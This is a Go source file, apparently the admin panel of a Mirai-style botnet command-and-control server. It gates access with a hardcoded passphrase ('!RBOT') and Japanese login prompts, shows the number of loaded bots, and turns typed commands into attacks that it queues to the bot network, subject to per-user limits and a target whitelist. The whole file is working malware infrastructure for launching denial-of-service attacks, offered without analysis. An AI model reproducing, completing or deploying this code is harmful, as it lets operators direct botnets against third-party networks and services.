package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "io/ioutil"
    //"strconv"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h Auth:"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()

    auth, err := this.ReadLine(false)
    if err != nil {
        return
    }

	if auth != "!RBOT" {
        return
    }

    headerb, err := ioutil.ReadFile("banner.txt")
    if err != nil {
        return
    }

    header := string(headerb)
    this.conn.Write([]byte(strings.Replace(strings.Replace(header, "\r\n", "\n", -1), "\n", "\r\n", -1)))

    // Get username
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\r\n\033[1;34mユーザー\033[1;33m: \033[1;37m"))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    // Get password
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[1;34mパスワード\033[1;33m: \033[1;37m"))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))
    this.conn.Write([]byte("\033[1;34m"+ this.conn.RemoteAddr().String() +"\033[1;33m."))

    for i := 0; i < 15; i++ {
        this.conn.Write([]byte("."))
        time.Sleep(time.Duration(210) * time.Millisecond)
    }

    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
        return
    }

    this.conn.Write([]byte("\r\n"))
    time.Sleep(1 * time.Second)

    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }

            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;%d Loaded\007", BotCount))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()

    for {
        var botCatagory string
        var botCount int
        this.conn.Write([]byte(fmt.Sprintf("\033[1;33m[\033[1;34m" + username + "\033[1;33m@\033[1;34m%d ~\033[1;33m]\033[1;34m#\033[1;37m ", clientList.Count())))
        cmd, err := this.ReadLine(false)

        if err != nil || cmd == "exit" || cmd == "quit" {
            return
        }

        if cmd == "" {
            continue
        }

        botCount = userInfo.maxBots

        if cmd == "bots" || cmd == "count" {
            m := clientList.Distribution()
            for k, v := range m {
                this.conn.Write([]byte(fmt.Sprintf("%s:\t[%d]\r\n", k, v)))
            }
            continue
        }

        if cmd == "cls" || cmd == "clear" {
            this.conn.Write([]byte("\033[2J\033[1;1H\033[1;37m"))
			this.conn.Write([]byte(strings.Replace(strings.Replace(header, "\r\n", "\n", -1), "\n", "\r\n", -1)))
			this.conn.Write([]byte("\r\n\r\n"))
			continue
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                } else {
                    fmt.Println("Blocked attack by " + username + " to whitelisted prefix")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            //this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\x1B' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                //this.conn.Write([]byte("*"))
            } else {
                //this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}
